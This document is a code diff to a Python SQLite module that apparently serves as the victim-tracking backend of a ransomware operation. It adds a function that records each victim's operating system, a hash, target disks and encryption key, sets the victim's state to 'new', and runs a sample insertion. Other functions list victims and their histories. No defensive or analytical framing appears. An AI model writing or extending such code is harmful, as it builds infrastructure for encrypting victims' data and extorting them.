@@ -11,6 +11,7 @@ def list_victim():
     c = conn.cursor()
 
     c.execute('SELECT * FROM victims')
+
     # récupération des résultats
     rows = c.fetchall()
 
@@ -20,6 +21,7 @@ def list_victim():
     conn.commit()
     conn.close()
     return victim_list
+
 
 
 def insert_victim(victim):
@@ -47,6 +49,39 @@ def insert_victim(victim):
     conn.commit()
     conn.close()
     return listing
+
+
+# Define a function to insert victim information into the database
+def insert_victim_new(os, hash, disks, key):
+    # Connection DB
+    conn = sqlite3.connect(DB_FILENAME)
+
+    now = datetime.now()
+    date_time = now.strftime("%Y-%m-%d %H:%M:%S")
+
+    # Get the highest ID from the "victims" table and increment it by 1
+    result = conn.execute("SELECT MAX(id_victim) FROM victims")
+    max_id = result.fetchone()[0]
+    if max_id is None:
+        max_id = 0
+    victim_id = max_id + 1
+
+    # Get the highest ID from the "states" table and increment it by 1
+    result = conn.execute("SELECT MAX(id_state) FROM states")
+    max_id = result.fetchone()[0]
+    if max_id is None:
+        max_id = 0
+    state_id = max_id + 1
+
+    # Insert victim's information into the "victims" table with the generated ID
+    conn.execute("INSERT INTO victims (id_victim, os, hash, disks, key) VALUES (?, ?, ?, ?, ?)", (victim_id, os, hash, disks, key))
+
+    # Insert a new state with the ID of the victim and the current date and time into the "states" table
+    conn.execute("INSERT INTO states (id_state, id_victim, date_time, state) VALUES (?, ?, ?, ?)", (state_id, victim_id, date_time, "new"))
+    conn.commit()
+
+
+
 
 
 def history_req(victim_id):
@@ -96,3 +131,12 @@ for i, history in enumerate(fake_histories):
     c.execute('INSERT INTO encrypted VALUES (?, ?, ?, ?)', [i+1, 1, history[0], history[2]])
 '''
 # commit the changes and close the connection
+
+
+
+
+# Call the function to insert victim information
+insert_victim_new("Windows", "ab12cd34", "C:\\", "mykey")
+
+
+print(list_victim())
